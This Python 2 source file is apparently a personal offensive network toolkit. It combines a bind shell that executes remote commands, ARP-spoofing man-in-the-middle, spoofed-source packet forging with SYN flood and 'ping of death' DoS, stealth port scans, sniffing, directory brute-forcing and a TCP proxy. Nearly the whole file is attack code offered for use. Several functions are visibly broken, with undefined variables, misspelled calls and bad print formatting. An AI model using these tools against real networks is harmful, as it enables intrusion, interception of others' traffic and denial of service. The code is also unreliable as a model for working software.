import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import sys
import socket
import getopt
import threading
import subprocess
import signal
import paramiko
import os
import struct
import random
import Queue
import urllib2
import urllib
from scapy.all import *
from ctypes import *


conf.verb = 0

# Simple cmdline network toolkit.
# Written by psyberlupus
# *psy*
# 19.10.2016



#define global variables
listen = False
command = False
scapy_on = False
interact = False
scan = False
execute = ""
target = ""
forge = False
sniff_on = False
buster = False
spoof = False
port = 0
wordlist_file = ""
socket_protocol = []
#Socket protocols
socket_protocol = [socket.IPPROTO_ICMP ,socket.IPPROTO_UDP, socket.IPPROTO_TCP ]

#ICMP header
class ICMPh(Structure):
   _fields_ = [
   ("type" , c_ubyte),
   ("code", c_ubyte),
   ("checksum" , c_ushort),
   ("unused" , c_ushort),
   ("next_hop_mtu" , c_ushort)
   ]


#IP header

class IPh(Structure):
   _fields_ = [
   ("ihl", c_ubyte, 4),
   ("version" , c_ubyte, 4),
   ("tos", c_ubyte),
   ("len", c_ushort),
   ("id", c_ushort),
   ("offset" , c_ushort),
   ("ttl" , c_ubyte),
   ("protocol_num",c_ubyte),
   ("sum", c_ushort),
   ("src", c_ulong),
   ("dst", c_ulong)
   ]
   def __new__(self, socket_buffer=None):
       return self.from_buffer_copy(socket_buffer)

   def __init__(self, socket_buffer = None):
       # map protocol constants to names 
       self.protocol_map = { 1:"ICMP",6:"TCP", 17:"UDP"}
       self.src_address = socket.inet_ntoa(struct.pack("<L",self.src))
       self.dst_address = socket.inet_ntoa(struct.pack("<L",self.dst))

       try:
         self.protocol = self.protocol_map[self.protocol_num]
       except:
         self.protocol = str(self.protocol_num)

def ssh_client(ip, user,passwd,command):
    client = paramiko.SSHClient()
    print "[***]  !!SSH CLIENT!!  [***]"
    print "Enter commands at prompt :)"
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user,password=passwd)
    ssh_session = client.get_transport().open_session()
    secure_shell = True
    while secure_shell:
      if ssh_session.active:
       
        stdin, stdout ,stderr = client.exec_command(command) 
        stdin.close()
        error = str(stderr.read())
        if error:
           print "Error!!!"
        else:
        
           print str(stdout.read())

      command = raw_input("psy:~>")
      if command.strip() == "exit":
          secure_shell = False
          ssh_session.close()
          break
      else:
          continue
    return
   

def get_mac(ipaddress):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipaddress),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

def restore_target(gateway_ip,gateway_mac,target_ip, target_mac):
    print "[*]  Restoring Target!!! :0"
    send(ARP(op=2 ,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count = 5)
    send(ARP(op=2 , psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff" , hwsrc=target_mac), count=5)
    print "[*] Target Restored!!!\n Goodbye :&"
    os.kill(os.getpid(), signal.SIGINT)
    sys.exit(0)


def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst =  gateway_mac

    print "\n[***]  !!! P0isi0ning ARP !!!  [***]"
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    while True:
        os
        try:
          send(poison_target)
          send(poison_gateway)
           
          time.sleep(2)
        except KeyboardInterrupt:
          restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    print " Attack Sucessful "
    return

# Add packet modifications !!!
def packet_callback(packet):
    
      
     try:
      # packet.show()
         if packet.haslayer(IP):
            src =packet[IP].src
            dst = packet[IP].dst         
         if len(packet[TCP].payload) > 10:
            print "%s >-> %s :   \n%s" % (src,dst,packet[TCP].payload)
     except:
            print "Fix Callback!!"
   # print packet.show()

def scapy_sniff():
    sniffing = True
     
    print "[***] !!! Sniffer !!! [***]\nPress Cntrl + C to Exit"
    while sniffing:
       host = raw_input("\npsy:~> Host: ")
       port = raw_input("psy:~> Port: ")
       protocol = raw_input("psy:~> Protocol: ")
       pcount = raw_input("psy:~> Count:  ")
       if not host and not port and protocol:
          fil = protocol
       elif not host and port and protocol:
          fil = protocol + " port " + port
       elif host and not port and protocol:
          fil = protocol + " and host " + host
       elif host and port and not protocol:
          fil = "port " + port + " and host " + host
       elif host and not port and not protocol:
          fil = "ip host " + host  
       else:
          fil = protocol+ " port " + port + " and host " + host
       interface = raw_input("psy:~> Interface:   ")
       print "psy:~> Filter: " + fil
       try:
         sniff(filter=fil, prn=packet_callback,  count=pcount, iface=interface)
       except:
         print "Sniffer Fault :("
         sniffing = False
         sys.exit(0)

def randomip():
    randip = socket.inet_ntoa(struct.pack('>I' , random.randint(1, 0xffffffff)))
    return randip

def forger(packet):
    print "[***] !!!!   Starting Forger  !!!!  [***]"
    print "<<<<<<<------- Received Packet ------->>>>>>>"
    changed = False
    forge_num = 0
    choose = True
    if packet.haslayer(TCP):
       print ("")
       print "%s >-> %s " % (packet[IP].src,packet[IP].dst) 
       print ("")
       print str(packet[TCP].payload)
       if len(packet[TCP]):
           print "\nSeq :  %s Ack : %s Flags : %s" % (packet[TCP].seq,packet[TCP].ack,packet[TCP].flags)
       f = raw_input("psy:~> Forge: (y/n)")
       if f == 'y':

          if packet.haslayer(IP):
             to_change = raw_input("psy:~> Enter the source ip to change: ")
          if to_change:
             forge_num = raw_input("psy:~> How many :")
             forge_num = int(forge_num)
          if packet[IP].src == to_change:
             packet[IP].src = randomip()
             changed = True
          dest_change = raw_input("psy:~> Enter the destination to forge: ")
          if dest_change:
             packet[IP].dst = dest_change
             changed = True
       if changed and not forge_num:
               
          send(packet)
       if changed and forge_num:
          print "[****]  !!! Spoofing %d IPs   [****]" % forge_num
          while forge_num:
                
                try:
                    packet[IP].src = randomip()
                    if choose:
                       syn = raw_input("\npsy:~>SYN Flood : (y/...)  ")
                       pd = raw_input("\npsy:~>  PING OF DEATH : (y/..) ")
                    if syn == 'y':
                       packet[TCP].flags = 'S'
                       packet[TCP].ack = 0
                       packet[TCP].seq = 1000
                       choose = False
                                      
                    if pd == 'y':
                         pod()
                         choose = False

                    sendp(packet)  
                except:
                    print "Send Error :("
                print "psy:~> Forged : %s  to  %s  with flags %s" % (packet[IP].src,packet[IP].dst,packet[TCP].flags)
                forge_num = forge_num -1 
          print "Done :)"




def sniffer(protocol): 
       sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, protocol)
       host= "0.0.0.0"
       sniffer.bind((host,0))
       sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL,1)
       try:
         while True:
            raw_buffer = sniffer.recvfrom(65565)[0]
	    ip_header = IPh(raw_buffer[0:20])
	 # printing out the protocol detected
	    print "Protocol: %s %s -> %s" % (ip_header.protocol, ip_header.src_address , ip_header.dst_address)
            try:
               if ip_header.protocol =="ICMP":
                  offset = ip_header.ihl * 4
                  buf = raw_buffer[offset:offset+sizeof(ICMP)]
                  icmp_header = ICMPh(buf)
                  print ("ICMP -> Type: {0} Code: {1}".format(icmp_header.type, icmp_header.code))
            except:
                  continue
            
       except KeyboardInterrupt:
         print "\nKilling Sniffer!!!"
         sys.exit(0)

def dos():
    print "[****]     D0S     [****]"
    pod()
    sys.exit(0)

def pod():
    try:
      print "[****]   PING OF DEATH   [****]"
      target = raw_input("psy:~>   target : ")
      nthreads = raw_input("psy:~>    threads : ")
      spoof_ip = raw_input("psy:~>    spoof ip : ")
      threads = []
      if target:
          nthreads = int(nthreads)
          print "Making %d threads" % nthreads
          while nthreads:
              thread = threading.Thread(target=flood, args=(target,))
              thread.daemon = True
              thread.start()
             
              threads.append(thread)
              nthreads = nthreads - 1
    except:  
       print "Invalid Input"
       sys.exit(0)
        
def flood(target):
    spoof_ip = randomip()
    packet = IP(dst=spoof , src=target)/ICMP()/("X" * 60000)
    print "!!!PING OF DEATH!!! :X"
    send(fragment(packet), loop=1)


def spoofer():
    global scapy_on
    global forge
    print ("[*] ARP-Spoofer Running!!! [*]")
    gateway = raw_input("psy:~> gateway: ")
    target = raw_input("psy:~> target: ")
    interface = raw_input("psy:~> interface :")
    #count = raw_input("psy:~> count :")
    conf.iface = interface
    conf.verb = 0
    gateway_mac = get_mac(gateway)
    target_mac = get_mac(target)
    if gateway_mac == None:
       print "Failed to get the gateway MAC id :("
       sys.exit(0)
    if target_mac == None:
       print "Failed to get the target MAC id :("
       sys.exit(0)
    poison_thread = threading.Thread(target=poison_target, args=(gateway,gateway_mac,target,target_mac))
    poison_thread.start()
    try:
        if forge:
         fil = raw_input("\npsy:~>  filter : ")
         interface = raw_input("psy:~>  interface : ")
         sniff(iface=interface,filter=fil,count = 50 , prn=forger)
        
        if scapy_on:
         scapy_sniff()
    except:
      restore_target(gateway,gateway_mac,target,target_mac)
      print "Restored!!"

def usage():
     print ("[!*!] P$Y [!*!]")
     print (" Realized by psyberlupus :)")
     print (" Usage: psy.py -t [TARGET_HOST] -p [TARGET_PORT]")
     print (" -l --listen                       Listen on a port for connections")
     print (" -e --execute=file_to_run          Execute the file on recieving connections")
     print (" -c --command                      Initialize a command shell")
     print (" -s --sniff ip packets [i/t/u]     Sniff packets [Only for Linux]")
     print (" -S --ssniff                       Advanced interactive sniffing")
     print (" -i --interact                     Interactive server hosting")
     print (" -A --arpspf                       ARP request spoof for MITM")
     print (" -r --remotessh                    SSH client")
     print (" -f --forge                        Forgery")
     print (" -d --dos                          DOS")
     print (" -D --dirbuster                    Busts hidden web directories")
     print (" -w --wordlist                     Specify a wordlist")
     print (" -P --portscan                     PortScanner")
     print (" -x --proxy                        TCP proxy")
     print (" -a --appmapper                    Web app mapper <local dir>")
     print ("")
     print (" Examples:   ")
     print (" psy.py -t 127.0.0.1 -p 1234 -l -c")
     print (" psy.py -t 192.168.0.1 -p 1234 -l -e c:\\target.exe")
     print (" psy.py -AS")
     print (" psy.py -l -i -p 1234")
     sys.exit(0)


def main():
     global listen
     global port
     global execute
     global command
     global sniff_on
     global target
     global interact
     global scapy_on
     global spoof 
     global forge
     global scan
     global wordlist_file
     global buster
          
     if not len(sys.argv[1:]):
            usage()
            # read the command line options
     try:
         opts, args = getopt.getopt(sys.argv[1:] , "ADhxadPfrliSs:e:t:p:c:w:", ["arpspf","dirbuster","help", "proxy", "appmapper" ,"dos", "portscan","forge" ,"remotessh", "listen" ,"interact" , "ssniff", "sniff", "execute", "target" , "port" ,"command","wordlist" ])

     except getopt.GetoptError as err:
        print (err)
        usage()

     for o,a in opts:
             if o in ("-h","--help"):
                    usage()
             elif o in ("-d" , "--dos"):
                    dos()
             elif o in ("-w" , "--wordlist"):
                    wordlist_file = a
             elif o in ("-A" , "--arpspf"):
                    spoof = True
             elif o in ("-r" , "--remotessh"):
                    user = raw_input("psy:~>  user: ")
                    passwd = raw_input("psy:~>  password: ")
                    host_ip = raw_input("psy:~>  host IP: ")
                    com = raw_input("psy:~>  command: ")
                    ssh_client(host_ip, user , passwd , com)
             elif o in ("-l" , "--listen"):
                    listen = True
             elif o in ("-e" ,"--execute"):
                    execute = a
             elif o in ("-c" , "--command"):
                    command = True
             elif o in ("-f" , "--forge"):
                    forge = True
             elif o in ("-P" , "--portscan"):
                    scan = True
             elif o in ("-x" , "--proxy"):
                    proxy()
             elif o in ("-s" ,"--sniff"):
                    sniff_on = True
                    if 'i' in a:
                      protocol = socket_protocol[0]
                    elif 'u' in a:
                      protocol = socket_protocol[1]
                    elif 't' in a:
                      protocol = socket_protocol[2]
             elif o in ("-S", "--ssniff"):
                    sniff_on = True
                    scapy_on = True
             elif o in ("-t" , "--target"):
                    target = a
             elif o in ("-p" ,"--port"):
                    port = int(a)
             elif o in ("-a" , "--appmapper"):
                    app_mapper()
             elif o in ("-i" , "--interact"):
	            interact = True
             elif o in ("-D" ,"--dirbuster"):
                    buster = True
             else: 
                    assert False,"Unhandled Option"


# Check the parameters and configure the listener
     if not listen and not scan and len(target) and port > 0:
         try:
             print "Type message and press enter :)"
	     print "Long-Press enter to exit"
             #print "psy:~>"
             buffer =  raw_input("psy:~>")       
             
             #buffer = buffer.encode()
# send data off
             client_sender(buffer)
	 except:
             print ("Killed!!!")
	     sys.exit(0)

# we are going to listen and potentially upload things,
# execute commands , and drop a shell back depending on 
# our commandline options

     if listen:
         if not target:
            target = "0.0.0.0"
            print "Listening on %s on port %d" % (target,port)  
            server_loop()

     if (not listen and sniff_on and not spoof):
         
         if scapy_on == True: 
            scapy_sniff()
         else:   
            print "[*] Sniffing Protocol :  %s [*]" % protocol 
            sniffer(protocol)

     if (not target and not port and not listen and spoof):
            spoofer() 
     if (not target and not port and not listen and forge and not spoof):
            inter = raw_input("psy:~>  Interface : ")
            cnt = 50
            sniff(store=0 , iface=inter, prn=forger , filter = "tcp port 80" , count = cnt)

     if scan:
            port_scanner()
     if buster:
           dir_buster()

def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    input_init = False
    try:
        #connect to target host
        print("Connecting %s at %d " % (target,port))
        client.connect((target,port))

        if len(buffer):
           client.send(buffer)
	   
           #client.send("\npsy:~>")
        while 1:
	   #now wait for data back
           client.settimeout(1)
	   try:
              data = client.recv(4096)
	      if not data: raise Exception()
	      print data
	      client.send("")
	   except:
	     # print "Exception"
	                
	      #print("psy:~>")
	      if not input_init: 
	             input_thread = threading.Thread(target=interactive,args=(client,))
	             input_thread.start()
		     input_init = True
	      continue

    
    except:
        #print "Exiting"
	client.close()
	sys.exit(0)

def interactive(client):
      #print "Timed!!"
      buffer = "Garbage!"
      while buffer:
           #print "psy:~>"
	   try:
             buffer = sys.stdin.readline().strip()
      	     if buffer == "":
	           client.send("")
	           continue
	   #print buffer
	     elif len(buffer):
           #print "Sending"
	           client.send(buffer)
	           continue
	     else: 
	           break
           except:
	      #print "Interupt"
	      #print "Closing"
	      client.close()
	      sys.exit(0)

      client.close()
	         
           	
	     #send it off

           
           #client.send("\npsy:~>")


def server_loop():
     global target
#if no target defined , we listen on all interfaces
     if not len(target):
         target = "0.0.0.0"

     server = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
     server.bind((target,port))
     server.listen(5)
     con = 0
     global online_sockets 
     online_sockets = {}

     while True:
         client_socket, addr = server.accept()
	 
         print("Connection from  " ,  (addr[0],addr[1]))
      # spin off a thread to handle our new client
         client_thread = threading.Thread(target=client_handler,args=(client_socket,))
         con = con + 1 
         add=True
         while add:
             online_sockets[chr(con)]=client_socket
             #print online_sockets
             add = False
         client_thread.start()


def run_command(command):
       # trim the newline
       command = command.rstrip()

       #run the command and get the output back
       try:
           output = subprocess.check_output(command,stderr=subprocess.STDOUT , shell = True)
       except:
           output = "Failed to execute command. \r\n"

       # send the output back to the client
       return output


def client_handler(client_socket):
     global upload
     global execute
     global command
     global listen
     global target
     
# check for command execution
     if len(execute) and not command:
        #run the command:
        output = run_command(execute)
        
        

        client_socket.send(output)

        client_socket.close()
        

	# now go to another loop if commanmd shell is requested
     if command:
           while True:
	        #show a single prompt
                client_socket.send('psy:~> '.encode())
		      #now we recieve until we see a line feed(enter)
                cmd_buffer = ""
                while "\n" not in cmd_buffer:
                    cmd = client_socket.recv(1024).decode()  
                    #if cmd == End:
                      #   client_socket.close()
                    cmd_buffer = cmd_buffer + cmd

	# send back the command output

                response = run_command(cmd_buffer)

		#send back the response

                client_socket.send(response)

     if (listen and not command and not interact):
               request = client_socket.recv(1024)
               while request:
                     try:
		       print (request)
                       request = client_socket.recv(1024)
                     #if response == End:
                     except:
		       client_socket.close()
		     
    # client_socket.close()
     if (interact and listen):
          #lient_socket.settimeout(20)
	  initial = True
	  while initial:
	    try:
              ignore = client_socket.recv(512)
              print "Interactive Server Psy:)"
              client_socket.send("\n[***] !Hello, this is psy interactive server!   [***]")
              client_socket.send("\nEnter Your Name:")
              name=client_socket.recv(1024)
              if (not name or len(name) > 6):
                  client_socket.send("\nName should be under 5 chars!!!\n Try Again:")
                  name=client_socket.recv(1024)
              print "%s connected!!!" % name.strip()
              client_socket.send("Start Speaking mate :)\npsy:~>")
              request=client_socket.recv(1024)
	      initial = False

	    except:
                continue
	  try:
	    while request:
                 print "%s says: %s" % (name.strip(),request)
                 bcast = '\n' + name.strip() + ':' + request
                 for con,socket in online_sockets.iteritems():
                     try:
		       socket.send(bcast)
                       socket.send("\npsy:~>")
		       
		     except:
		       socket.close()
		       print "%s died" % name.strip()
                       #print "no exp"
                      		       
		 request = client_socket.recv(1024)     
          except:
            print("Last")
            client_socket.close()

def port_scanner():
    global target
    global port
    targets =[]
    scan = True
    
    ranged = False
    if target == "0.0.0.0" or target == "127.0.0.1" or target == '':
        target = raw_input("psy:~>  target  : ")
    if port:
       lport = int(port)
       hport = int(port)
    while scan:
     try:
       if not port:
          lport = raw_input("psy:~>  enter low port : ")
          hport = raw_input("psy:~>  enter higher port : ")
           
      
       print "\n[****] !!! P0rt Scanner Loaded !!! [***]"
      # target_mac =get_mac(target)
     #  print "psy:~> target mac : %s " % (target_mac)
       print "psy:~> What scan do you want? "
       print ""
       print "Enter t for TCP Connect scan"
       print "Enter s for TCP stealth scan"
       print "Enter x for XMAS scan"
       print "Enter f for FIN scan"
       print "Enter n for NULL scan"
       print "Enter a for TCP ACK scan"
       print "Enter w for TCP WINDOW scan"
       print "Enter u for UDP scan"
       inp = raw_input("psy:~> Time to choose mate :  ")
       if not target:
           get_target = True
           while get_target:
             target = raw_input("psy:~>  Keep Entering targets :  ")
             print "enter 'done' when done"
             
             if target == 'done':
                 get_target = False
                 break
             targets.append(target)
       print "psy:~>    Given targets : "
       print targets 
       if targets:          
          for target in targets:
             target_thread = threading.Thread(target=portsc,args=(target,lport,hport,inp))
             target_thread.start()
             ranged = True
          time.sleep(10)
          targets =[]
                  
       try:
      #  print "%s %s %s %s " % (target,lport,hport,inp)   
        if not ranged:
            portsc(target,lport,hport,inp)
       except:
           print "Here!!"
       target_new = raw_input("\npsy:~>  New target : ")
       if target_new:
           target = target_new
           ranged = False
     except:
       print "\nScanner killed :("
       scan = False

def portsc(target,lport,hport, inp):
       s_port = RandShort()
      
       try:
        for d_port in range(int(lport),int(hport)+1):
           try:
             if inp == 't':
               #print "Tcp Connect !!"
               tcp_connect(target,d_port,s_port)
            #   print "scene"
             elif inp == 's':
               tcp_stealth(target,d_port,s_port)
            
             elif inp == 'x':
               xmas(target,d_port,s_port)
             elif inp == 'f':
               fin_scan(target,d_port,s_port)
             elif inp == 'n':
               null_scan(target,d_port,s_port)
             elif inp == 'a':
               tcp_ack(target,d_port,s_port)
             elif inp == 'w':
               tcp_window(target,d_port,s_port)
             elif inp == 'u':
               udp_scan(target,d_port,s_port)
             else:
               print "Wrong entry!!!! :("
               sys.exit(0)
           except:
               print "Network Error :("
             
       except:
           print "\nError Here :("

        

def tcp_connect(target,d_port,s_port):
    try:
      ping = sr1(IP(dst=target)/ICMP())
    except:
        print "Host not found :(  %s " % target
        sys.exit(0)
#    print "TCP Connect scan on host %s" % target
    res = sr1(IP(dst=target)/TCP(sport=s_port ,dport=d_port, flags = 'S'),timeout=10)
    if (res.haslayer(TCP)):
        if (res[TCP].flags == 0x12):
            print "\nOpened %d host %s" % (d_port,target)
            send_rst = sr1(IP(dst=target)/TCP(sport=s_port,dport=d_port,flags='AR'),timeout=10)
          #  print "Opened %d host %s" % d_port,target
        elif (res.getlayer(TCP).flags == 0x14):
         #   print "Closed %d" % d_port
            pass

def tcp_stealth(target,d_port,s_port):
    res = sr1(IP(dst=target)/TCP(sport=s_port,dport=d_port,flags='S'),timeout = 10)
   # print "TCP STREALTH target %s" % target
    if res.haslayer(TCP):
       if(res[TCP].flags == 0x12):
           print "\nOpened %d host %s " % (d_port, target)
           try:
            send_rst = sr1(IP(dst=target)/TCP(sport=s_port,dport=d_port,flags='R'),timeout=10) 
           except:
               print "Cant send reset"
       elif(res[TCP].flags == 0x14):
        #   print "Closed %s " % d_port
            pass
       elif(res.haslayer(ICMP)):
           if(int(res[ICMP].type) == 3 and int(res[ICMP].code) in [1,2,3,9,10,13]):
              print "Filtered %s host %s " % d_port,target

def xmas(target,d_port,s_port):
    try:
      res = sr1(IP(dst=target)/TCP(sport=s_port,dport=d_port,flags='FPU'))
      if not res: raise Exception
      if (res.haslayer(TCP)):
         if(res[TCP].flags == 0x14):
         #   print "Closed %d" % d_port
            pass
         elif(res.haslayer(ICMP)):
             if(int(res[ICMP].type) == 3 and int(res[ICMP].code) in [1,2,3,9,10,13]):
                print "Filtered %d host %s" % d_port,target
    except:
            print "Open | Filtered %d host %s" % d_port,target

def fin_scan(target,d_port,s_port):
    try:
      res = sr1(IP(dst=target)/TCP(dport=d_port,sport=s_port,flags='F'))
      if not res : raise Exception
      if (res.haslayer(TCP)):
         if(res[TCP].flags == 0x14):
      #     print "Closed %d" % d_port
                pass
      elif(res.haslayer(ICMP)):
           if(int(res[ICMP].type) == 3 and int(res[ICMP].code) in [1,2,3,9,10,13]):
               print "Filtered %d host %s" % d_port,target
    except:
               print "Open %d host %s" % d_port,target

def null_scan(target,d_port,s_port):
    try:
        res= sr1(IP(dst=target)/TCP(dport=d_port,sport=s_port,flags=''))
        if not res: raise Exception
        if (res.haslayer(TCP)):
           if (res[TCP].flags == 0x14):
       #         print "Closed %d " % d_port
                    pass
        elif (res.haslayer(ICMP)):
           if(int(res[ICMP].type) == 3 and int(res[ICMP].code) in [1,2,3,9,10,13]):
              print "Filtered %d host %s" % d_port,target
    except:       
         print "Opened %d host %s" % d_port,target

def tcp_ack(target,d_port,s_port):     
    res = sr1(IP(dst=target)/TCP(sport=s_port,dport=d_port,flags='A'))
    if res.haslayer(TCP):
       if (res[TCP].flags == 0x4):
          print "No firewall!!! port %d host %s" % d_port,target
    elif res.haslayer(ICMP):
       if(int(res[ICMP].type) == 3 and int(res[ICMP].code) in [1,2,3,9,10,13]):
           print "Firewall at place !!!! port %d host %s" % d_port,target

def tcp_window(target,d_port,s_port):
    res = sr1(IP(dst=target)/TCP(dport=d_port,sport=s_port,flags='A'))
    if res.haslayer(TCP):
       if(res[TCP].window == 0 ):
          print "closed %d host %s" % d_port,target
       if(res[TCP].window > 0 ):
          print "open %d host %s" % d_port,target
    else:
         print "No response %d host %s " %d_port,target

def udp_scan(target,d_port,s_port):
    dtimeout = 10
    try:
      res = sr1(IP(dst=target)/UDP(dport=d_port,sport=s_port),timeout=dtimeout)
      if not res: raise Exception
      if res.haslayer(UDP):
         print "Open %d host %s "  % d_port,target
      elif res.haslayer(ICMP):
         if(int(res[ICMP].type) == 3 and int(res[ICMP].code) == 3):
             print "Closed %d host %s" % d_port,target
         elif(int(res[ICMP].type) == 3 and int(res[ICMP].code) in [1,2,9,10,13]):
            print "Filtered %d " , d_port
    except:   
            print "Open | Filtered %d host %s" % d_port,target

def proxy_handler(client_socket, remote_host, remote_port, receive_first):
     #connect to the remote host
    remote_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remote_socket.connect((remote_host, remote_port))
    # receive data from remote end if needed
    if receive_first: 
       remote_buffer = receive_from(remote_socket)
       hexdump(remote_buffer)

     #sending it to response handler
       remote_buffer = response_handler(remote_buffer)
       # if we have data to send to client, send it

       if len(remote_buffer):
             print "\n[==>] Sending %d bytes to localhost." % len(remote_buffer)
             client_socket.send(remote_buffer)

# now lets loop and read from local, send to remote
# send to local 
# rinse , wash and repeat
    while True:
       # read from local host

       local_buffer = receive_from(client_socket)
       if len(local_buffer):
            print "\n[==>] Received %d bytes from localhost."  % len(local_buffer)
            hexdump(local_buffer)

            # send data off to remote host
            remote_socket.send(local_buffer)
            print "\n[==>] Sent to remote."

# receive back the response 
       
       remote_buffer = receive_from(remote_socket)
       if len(remote_buffer):
             print "\n[<==] Recieved %d bytes from remote." % len(remote_buffer)
             hexdump(remote_buffer)
# send to our response handler
             remote_buffer = response_handler(remote_buffer)


# send the response to the local socket

             client_socket.send(remote_buffer)
             print "[<==] Sent to localhost."
# if no more data on either side, lets close the scene :)
       if not len(remote_buffer) or not len(local_buffer):
              client_socket.close()
              remote_socket.close()
              print "\n [!!!]  No more data."
              print "\n [!!!]  Closing connections."
              break

def hexdump(src , length=16):
      result = []
      digits = 4 if isinstance(src , unicode) else 2
      for i in xrange(0, len(src) , length):
        s = src[i: i+length]
        hexa = b' '.join(["%0*X" % (digits, ord(x)) for x in s])
        text = b''.join([x if 0x20 <= ord(x) < 0x7F else b'.' for x in s])
        result.append( b"%04X %-*s %s" % (i, length*(digits+1) , hexa , text))
     
      print b'.\n'.join(result)

def receive_from(connection):
      buffer =""
      # setting a 2 sec timeout

      connection.settimeout(2)

      try:
          # keep reading into the buffer until there's no more data
        while True:
              data = connection.recv(4096)
              if not data:
                    break
              buffer += data
      except:
         pass

      return buffer


# modify any responses destined for the remotehost
def request_handler(buffer):
    # perform modifications
    return buffer

# modify responses desttined for the localhost
def response_handler(buffer):
      # perform reponse modifications
      return buffer

def proxy_loop(local_host,local_port,remote_host,remote_port,receive_first):
   server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   try:
        server.bind((local_host,local_port))
   except:
        print "[!!] Failed to listen on %s:%d" % (local_host,local_port)
        print "[!!] Check for other listening sockets or correct permissions."
        sys.exit(0)
   print "[*] Listening on %s:%d" % (local_host,local_port)

   server.listen(5)
   while True:
      client_socket , addr = server.accept()
      # print out the local connection information
      print "\n[==>] Recieved incoming connection from %s:%d" % (addr[0], addr[1])
      

      #start thread to talk to remote host
      proxy_thread = threading.Thread(target=proxy_handler, args=(client_socket, remote_host, remote_port , receive_first))
      proxy_thread.start()

def proxy():
   
#set up local listing parameters
   local_host = raw_input("psy:~> Local IP: ")
   local_port = raw_input("psy:~>   local port : ")
   
#set up remote target
   remote_host = raw_input("psy:~>  remote IP : ")
   remote_port = raw_input("psy:~>  remore port : ")
   remote_port = int(remote_port)
   local_port = int(local_port)
#this tells the proxy to connect nd recieve data first
# before sending data to the server

   receive_first = raw_input("psy:~>  receive first : (y/-) ")
   
   if receive_first == 'y':
       receive_first = True
   else:
       recieve_first = False

#now spin up our listening socket
   proxy_loop(local_host, local_port, remote_host, remote_port, receive_first)


def app_mapper():
    print "\n[***]  Web App SCANNER <Local Dir>  [***]"
    threadc = raw_input("\npsy:~>   Thread Count  : ")
    global target
    directory = raw_input("psy:~>  Local downloaded dir : ")
    filters = [".jpg" , ".gif" , ".png" , ".css" ]

    os.chdrir(directory)
    web_paths = Queue.Queue()

    for r,d,f in os.walk("."):
        for files in f:
           remote_path = "%s/%s" , (r,files)
           if remote_path.startswith("."):
              remote_path = remote_path[1:]
           if os.path.splitest(files)[1] not in filters:
              web_paths.put(remote_path)
    for i in range(threadc):
       print ""
       t = threading.Thread(target=test_remote)
       t.start()




def test_remote():
    global target
    if not target:
        target = raw_input("psy:~>   target : ") 
    while not web_paths.empty():
      path = web_paths.get()
      url = "%s%s" % (target,files)

      request = urllib2.Request(url)
      try:
        response = urllib2.urlopen(request)
        content = response.read()
        print "[%d] => [%s] " % (response.code,path)
        response.close()
      except urllib2.HTTPError as error:
        pass     

def build_wordlist(wordlist_file):
  
    fd =  open(wordlist_file,"rb")
    raw_words = fd.readlines()
    fd.close()
    words =Queue.Queue()
    try:
      for word in raw_words:
         word = word.rstrip()
         words.put(word)
    except:
        print "Error Parsing Wordlist :("
    return words
        
def dir_bruter(site,word_queue,extentions=None,user_agent="psyberlupus"):
    while not word_queue.empty():
          attempt = word_queue.get()
          attempt_list = []

          if "." not in attempt:
              attempt_list.append("/%s/" % attempt)
          else:
              attempt_list.append("/%s" % attempt)
          if extentions:
              for extention in extentions:
                  attempt_list.append("/%s%s" % (attempt,extention))
          for brute in attempt_list:
              url = "%s%s" % (site,urllib.quote(brute))
              try:
                headers = {}
                headers["User-Agent"] = user_agent
                r = urllib2.Request(url,headers=headers)
                response = urllib2.urlopen(r)
                if len(response.read()):
                   print "[%d] => [%s] " % (response.code,url)
              except urllib2.URLError,e:   
                if hasattr(e,'code') and e.code != 404:
                     print "!!! %d => %s " % (e.code,url)
                pass

def dir_buster():
    global wordlist_file
    global target
    print ("\n [****]      !! DirBuster!!      [****]")
    if not len(target) > 4:
        site = raw_input("psy:~>   target :")
    else:
        site = target
    threadc = raw_input("psy:~>    Enter thread count : ")
    if not wordlist_file:
          wordlist_file = raw_input("psy:~>   Enter wordlist: ")
    user_agent = raw_input("psy~>  user-agent : ")
    print "wordlist loaded %s" % wordlist_file
    word_queue = build_wordlist(wordlist_file)
    extensions = [".php",".bak",".orig",".inc"]
    print "Default Extentions : %s " %  extensions
    extent = raw_input("psy:~>   added extention:  ")
    if extent:
       extentions.append(extent)
    for i in range(int(threadc)):
        t = threading.Thread(target=dir_bruter, args=(site,word_queue,extensions,user_agent))
        t.start()


         
main()

